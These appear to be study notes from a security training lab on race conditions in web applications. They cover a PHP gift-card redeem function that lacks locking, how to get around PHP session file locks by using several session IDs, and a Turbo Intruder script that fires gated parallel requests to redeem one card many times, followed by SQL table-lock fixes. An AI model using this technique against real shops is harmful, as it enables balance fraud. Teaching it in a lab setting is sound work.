# Race Conditions

Race conditions in web applications arise when the developers do not account for the simultaneous execution of certain control paths due to multithreading. In particular, this also includes single-threaded languages like PHP if the web server itself supports multithreading. Since many web servers spawn multiple worker threads by default, the prerequisites are met for most default web server configurations

<aside>
💡

Every function could be a possible target. For example, the card generation, redeem etc. Depending if the functions have been secured with a LOCK mechanism.

</aside>

# **Code Review - Identifying the Vulnerability**

- Example: Web shop

![image.png](Race%20Conditions/image.png)

![image.png](Race%20Conditions/image%201.png)

```python
POST /shop.php HTTP/1.1
Host: racecondition.htb
Content-Length: 23
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=qvvchpk8h4qnotbniqqffd1nuv

redeem=7204884880747967
```

```php
function redeem_gift_card($username, $code) {
    $gift_card_balance = check_gift_card_balance($code);

    if ($gift_card_balance === 0) {
        return "Invalid Gift Card Code!";
    }

    // update user balance
    $user = fetch_user_data($username);
    $new_balance = $user['balance'] + $gift_card_balance;
    update_user_balance($username, $new_balance);

    // invalidate code
    invalidate_gift_card($code);

    return "Successfully redeemed gift card. Your new balance is: " . $new_balance . '$';
}
```

The code assumes synchronous actions since there are no locks or other mechanisms that would prevent race conditions. To illustrate this further, have a look at the following sequence of events consisting of the important steps of the `redeem_gift_card` function for both threads for a 10$ gift card:

| **Thread 1** | **Thread 2** | **User's Balance** |
| --- | --- | --- |
| `redeem_gift_card("htb-stdnt", 7204884880747967)` | - | `0$` |
| `check_gift_card_balance(7204884880747967)` | - | `0$` |
| `fetch_user_data("htb-stdnt")` | - | `0$` |
| `update_user_balance("htb-stdnt", 10$)` | - | `10$` |
| - | `redeem_gift_card("htb-stdnt", 7204884880747967)` | `10$` |
| - | `check_gift_card_balance(7204884880747967)` | `10$` |
| - | `fetch_user_data("htb-stdnt")` | `10$` |
| - | `update_user_balance("htb-stdnt", 20$)` | `20$` |
| `invalidate_gift_card(7204884880747967)` | - | `20$` |
| - | `invalidate_gift_card(7204884880747967)` | `20$` |

### **PHP Session Files and File Locks**

- Sessions are stored on the web servers file system
- Server thus needs read and write access to these files
- PHP uses file locks for https://www.php.net/manual/en/function.session-start.php to make sure no unsafe states are reached
- Therefore, these file locks indirectly prevent the exploitation of race conditions if session variables are used in the vulnerable PHP file
- The race condition is only accessible after logging in, so session variables are used
- If we attempt to send multiple requests using the same PHP session, the file locks will prevent simultaneous execution
- We can simply use different sessions in our exploit

### **Burp Turbo Intruder**

https://portswigger.net/research/turbo-intruder-embracing-the-billion-request-attack

In the first step, we must generate multiple valid session IDs to avoid running into the file lock issue described above. To do so, we can send the login request to Burp Repeater, send it about `5` times, and take note of the five different `PHPSESSID` cookies:

![image.png](Race%20Conditions/image%202.png)

To exploit the race condition, we will buy a gift card, intercept the request to redeem the code and drop it so it is not redeemed on the backend. We can then send the request to redeem the code to `Turbo Intruder` from Burp's HTTP history:

![image.png](Race%20Conditions/image%203.png)

![image.png](Race%20Conditions/image%204.png)

**Note:** This script does not exist in the latest version of Turbo Intruder. If you are already familiar with Turbo Intruder, feel free to use any other script as a baseline and adjust it to your needs. Otherwise, you can find the `race.py` script in the Turbo Intruder GitHub repository [here](https://github.com/PortSwigger/turbo-intruder/blob/b5c6e2d614cf8db0e9b02a32dd06119161888e17/resources/examples/race.py). You can simply copy and paste it into the Turbo Intruder window and continue from there.

- rade.py
    
    ```python
    def queueRequests(target, wordlists):
        engine = RequestEngine(endpoint=target.endpoint,
                               concurrentConnections=30,
                               requestsPerConnection=100,
                               pipeline=False
                               )
    
        # the 'gate' argument blocks the final byte of each request until openGate is invoked
        for i in range(30):
            engine.queue(target.req, target.baseInput, gate='race1')
    
        # wait until every 'race1' tagged request is ready
        # then send the final byte of each request
        # (this method is non-blocking, just like queue)
        engine.openGate('race1')
    
        engine.complete(timeout=60)
    
    def handleResponse(req, interesting):
        table.add(req)
    ```
    

The turbo intruder window consists of two main parts: the HTTP request at the top and the exploit script at the bottom. The script at the bottom is written in Python, and we can modify it according to our needs. Turbo Intruder inserts a payload into the request wherever a `%s` is specified. In our case, we need to add different session cookies to the requests to avoid running into the file lock issue. Therefore, we will modify the request at the top by replacing the session cookie with the value `%s` such that the corresponding line looks like this:

```python
<SNIP>
Cookie: PHPSESSID=%s
<SNIP>
```

![image.png](Race%20Conditions/image%205.png)

Now we have to specify the payload, which is the second parameter of the `engine.queue` function call. Thus, we modify the exploit script to look like this by inserting the valid session cookies we obtained in the previous step:

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=100,
                           pipeline=False
                           )

		# the 'gate' argument blocks the final byte of each request until openGate is invoked
    for sess in ["p5b2nr48govua1ieljfdecppjg", "48ncr9hc1rjm361fp7h17110ar", "0411kdhfmca5uqiappmc3trgcg", "m3qv0d1qu7omrtm2rooivr7lc4", "onerh3j83jopd5ul8scjaf14rr"]:
        engine.queue(target.req, sess, gate='race1')

    # wait until every 'race1' tagged request is ready
    # then send the final byte of each request
    # (this method is non-blocking, just like queue)
    engine.openGate('race1')

    engine.complete(timeout=60)

def handleResponse(req, interesting):
    table.add(req)
```

# **Prevention & Patching**

Now that we have seen how to exploit race condition vulnerabilities let us discuss how to prevent them. Since race conditions can arise in different contexts, prevention depends on the concrete vulnerability. For instance, if the race condition arises due to simultaneous file accesses, it can be prevented by implementing file locks similar to the PHP session file locks. In our case, the race condition exists because of simultaneous database accesses from multiple threads. To prevent this, we need to implement `SQL locks`. They work similarly to file locks. There are `READ` locks which allow the current session to read the table but not write to it. Other sessions are still allowed read access to the table but write access is prevented. Furthermore, there are `WRITE` locks that allow the current session read and write access to the table and prevent all access to the table by other sessions. Thus, our race condition can be prevented by obtaining a `WRITE` lock on the `users` table since the user's balance is updated and a `WRITE` lock on the `active_gift_cards` table since the gift card code is removed. We can achieve this by executing the following SQL query:

Code: sql

```sql
LOCK TABLES active_gift_cards WRITE, users WRITE;

```

After the code has been redeemed, we can release the locks by executing the following query:

Code: sql

```sql
UNLOCK TABLES;

```

This prevents simultaneous access to the database by multiple threads, thus preventing the race condition vulnerability. For more details, check out the SQL documentation on locks [here](https://dev.mysql.com/doc/refman/8.0/en/lock-tables.html).